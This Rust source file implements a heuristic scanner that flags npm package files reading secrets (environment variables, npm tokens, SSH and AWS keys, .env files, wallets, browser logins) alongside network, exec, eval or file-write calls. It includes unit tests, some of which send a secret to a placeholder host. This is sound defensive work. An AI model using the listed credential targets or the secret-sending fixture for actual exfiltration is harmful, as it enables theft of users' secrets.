use crate::analyzer::Analyzer;
use crate::model::{
    FileFacts, FlowObs, PackageFacts, PackageVersion, SinkKind, SinkObs, SourceKind, SourceObs,
    evidence,
};
use regex::Regex;
use std::collections::BTreeMap;

pub struct HeuristicAnalyzer;

impl Analyzer for HeuristicAnalyzer {
    fn name(&self) -> &str {
        "heuristic"
    }

    fn analyze_package(&self, pkg: &PackageVersion) -> PackageFacts {
        let source_patterns = source_patterns();
        let sink_patterns = sink_patterns();

        let mut files = pkg
            .files
            .iter()
            .filter_map(|file| {
                let mut sources = Vec::new();
                let mut sinks = Vec::new();

                for (index, line) in file.contents.lines().enumerate() {
                    let line_number = index + 1;

                    for (kind, pattern) in &source_patterns {
                        if pattern.is_match(line) {
                            sources.push(SourceObs {
                                kind: *kind,
                                evidence: evidence(&file.path, line_number, line),
                            });
                        }
                    }

                    for (kind, pattern) in &sink_patterns {
                        if pattern.is_match(line) {
                            sinks.push(SinkObs {
                                kind: *kind,
                                evidence: evidence(&file.path, line_number, line),
                            });
                        }
                    }
                }

                sources.sort_by(|a, b| a.kind.cmp(&b.kind).then(a.evidence.cmp(&b.evidence)));
                sinks.sort_by(|a, b| a.kind.cmp(&b.kind).then(a.evidence.cmp(&b.evidence)));
                sources.dedup_by(|a, b| a.kind == b.kind && a.evidence == b.evidence);
                sinks.dedup_by(|a, b| a.kind == b.kind && a.evidence == b.evidence);

                let flows = infer_flows(&sources, &sinks);

                if sources.is_empty() && sinks.is_empty() {
                    None
                } else {
                    Some(FileFacts {
                        path: file.path.clone(),
                        sources,
                        sinks,
                        flows,
                    })
                }
            })
            .collect::<Vec<_>>();

        files.sort_by(|a, b| a.path.cmp(&b.path));

        PackageFacts { files }
    }
}

fn source_patterns() -> Vec<(SourceKind, Regex)> {
    vec![
        (
            SourceKind::ProcessEnv,
            Regex::new(r"process\s*\.\s*env").unwrap(),
        ),
        (
            SourceKind::NpmToken,
            Regex::new(r"\.npmrc|NPM_TOKEN|_authToken").unwrap(),
        ),
        (
            SourceKind::SshKey,
            Regex::new(r"\.ssh/|\.ssh\\|id_rsa").unwrap(),
        ),
        (
            SourceKind::AwsCredentials,
            Regex::new(r"\.aws/credentials|\.aws\\credentials|AWS_SECRET_ACCESS_KEY").unwrap(),
        ),
        (
            SourceKind::EnvFile,
            Regex::new(r#"["'`][^"'`]*\.env(?:\.[^"'`]*)?["'`]"#).unwrap(),
        ),
        (
            SourceKind::WalletData,
            Regex::new(r"wallet\.dat|keystore|MetaMask").unwrap(),
        ),
        (
            SourceKind::BrowserData,
            Regex::new(r"Login Data|Cookies|leveldb").unwrap(),
        ),
    ]
}

fn sink_patterns() -> Vec<(SinkKind, Regex)> {
    vec![
        (
            SinkKind::NetworkSend,
            Regex::new(
                r"fetch\s*\(|https?\.request|axios|net\.connect|WebSocket\s*\(|\.post\s*\(|dns\.",
            )
            .unwrap(),
        ),
        (
            SinkKind::ProcessExec,
            Regex::new(r"child_process|execSync\s*\(|exec\s*\(|spawn\s*\(|execFile\s*\(").unwrap(),
        ),
        (
            SinkKind::DynamicEval,
            Regex::new(r"eval\s*\(|new\s+Function\s*\(|vm\.runIn").unwrap(),
        ),
        (
            SinkKind::FilesystemWrite,
            Regex::new(r"writeFileSync\s*\(|createWriteStream\s*\(").unwrap(),
        ),
    ]
}

fn infer_flows(sources: &[SourceObs], sinks: &[SinkObs]) -> Vec<FlowObs> {
    if !sinks.iter().any(|sink| sink.kind == SinkKind::NetworkSend) {
        return Vec::new();
    }

    let mut source_evidence = BTreeMap::new();

    for source in sources {
        source_evidence
            .entry(source.kind)
            .or_insert_with(|| source.evidence.clone());
    }

    source_evidence
        .into_iter()
        .map(|(source, evidence)| FlowObs {
            source,
            sink: SinkKind::NetworkSend,
            evidence,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{Manifest, SourceFile};
    use std::collections::BTreeMap;

    fn package(contents: &str) -> PackageVersion {
        PackageVersion {
            name: "case".to_string(),
            version: "1.0.0".to_string(),
            manifest: Manifest {
                name: "case".to_string(),
                version: "1.0.0".to_string(),
                scripts: BTreeMap::new(),
                raw: "{}".to_string(),
            },
            files: vec![SourceFile {
                path: "src/index.js".to_string(),
                contents: contents.to_string(),
            }],
        }
    }

    fn first_file_facts(contents: &str) -> FileFacts {
        HeuristicAnalyzer
            .analyze_package(&package(contents))
            .files
            .into_iter()
            .next()
            .unwrap()
    }

    #[test]
    fn name_is_heuristic() {
        assert_eq!(HeuristicAnalyzer.name(), "heuristic");
    }

    #[test]
    fn env_plus_fetch_yields_flow() {
        let facts = first_file_facts(
            "const secret = process.env.SECRET_VALUE;\nfetch('https://example.invalid', { body: secret });",
        );

        assert_eq!(facts.flows.len(), 1);
        assert_eq!(facts.flows[0].source, SourceKind::ProcessEnv);
        assert_eq!(facts.flows[0].sink, SinkKind::NetworkSend);
    }

    #[test]
    fn env_alone_yields_source_without_flow() {
        let facts = first_file_facts("const secret = process.env.SECRET_VALUE;");

        assert_eq!(facts.sources.len(), 1);
        assert_eq!(facts.sources[0].kind, SourceKind::ProcessEnv);
        assert!(facts.sinks.is_empty());
        assert!(facts.flows.is_empty());
    }

    #[test]
    fn fetch_alone_yields_sink_without_flow() {
        let facts = first_file_facts("fetch('https://example.invalid/ping');");

        assert!(facts.sources.is_empty());
        assert_eq!(facts.sinks.len(), 1);
        assert_eq!(facts.sinks[0].kind, SinkKind::NetworkSend);
        assert!(facts.flows.is_empty());
    }

    #[test]
    fn evidence_carries_file_path_and_line_number() {
        let facts = first_file_facts(
            "const ok = true;\nconst secret = process.env.SECRET_VALUE;\nfetch('https://example.invalid', { body: secret });",
        );

        assert_eq!(facts.sources[0].evidence.file, "src/index.js");
        assert_eq!(facts.sources[0].evidence.line, 2);
        assert_eq!(facts.sinks[0].evidence.file, "src/index.js");
        assert_eq!(facts.sinks[0].evidence.line, 3);
    }

    #[test]
    fn source_patterns_cover_expected_vocabulary() {
        let cases = [
            (SourceKind::ProcessEnv, "const value = process.env.SECRET;"),
            (SourceKind::NpmToken, "const value = '_authToken=abc';"),
            (SourceKind::SshKey, "const value = '/home/me/.ssh/id_rsa';"),
            (
                SourceKind::AwsCredentials,
                "const value = 'AWS_SECRET_ACCESS_KEY';",
            ),
            (SourceKind::EnvFile, "fs.readFileSync('.env');"),
            (SourceKind::WalletData, "const value = 'wallet.dat';"),
            (SourceKind::BrowserData, "const value = 'Login Data';"),
        ];

        for (expected, contents) in cases {
            let facts = first_file_facts(contents);
            assert!(
                facts.sources.iter().any(|source| source.kind == expected),
                "missing source kind {expected:?} for {contents}"
            );
        }
    }

    #[test]
    fn sink_patterns_cover_expected_vocabulary() {
        let cases = [
            (SinkKind::NetworkSend, "fetch('https://example.invalid');"),
            (SinkKind::NetworkSend, "https.request(options);"),
            (SinkKind::NetworkSend, "axios.post('/event');"),
            (
                SinkKind::NetworkSend,
                "net.connect(443, 'example.invalid');",
            ),
            (
                SinkKind::NetworkSend,
                "new WebSocket('wss://example.invalid');",
            ),
            (SinkKind::NetworkSend, "client.post('/event');"),
            (SinkKind::NetworkSend, "dns.lookup('example.invalid');"),
            (SinkKind::ProcessExec, "child_process.exec('echo ok');"),
            (SinkKind::ProcessExec, "execSync('echo ok');"),
            (SinkKind::ProcessExec, "exec('echo ok');"),
            (SinkKind::ProcessExec, "spawn('node');"),
            (SinkKind::ProcessExec, "execFile('node');"),
            (SinkKind::DynamicEval, "eval(payload);"),
            (SinkKind::DynamicEval, "new Function(payload);"),
            (SinkKind::DynamicEval, "vm.runInNewContext(payload);"),
            (SinkKind::FilesystemWrite, "fs.writeFileSync(path, data);"),
            (SinkKind::FilesystemWrite, "fs.createWriteStream(path);"),
        ];

        for (expected, contents) in cases {
            let facts = first_file_facts(contents);
            assert!(
                facts.sinks.iter().any(|sink| sink.kind == expected),
                "missing sink kind {expected:?} for {contents}"
            );
        }
    }

    #[test]
    fn repeated_source_kind_produces_one_flow() {
        let facts = first_file_facts(
            "const a = process.env.A;\nconst b = process.env.B;\nfetch('https://example.invalid', { body: a + b });",
        );

        assert_eq!(facts.flows.len(), 1);
        assert_eq!(facts.flows[0].source, SourceKind::ProcessEnv);
        assert_eq!(facts.flows[0].sink, SinkKind::NetworkSend);
    }
}
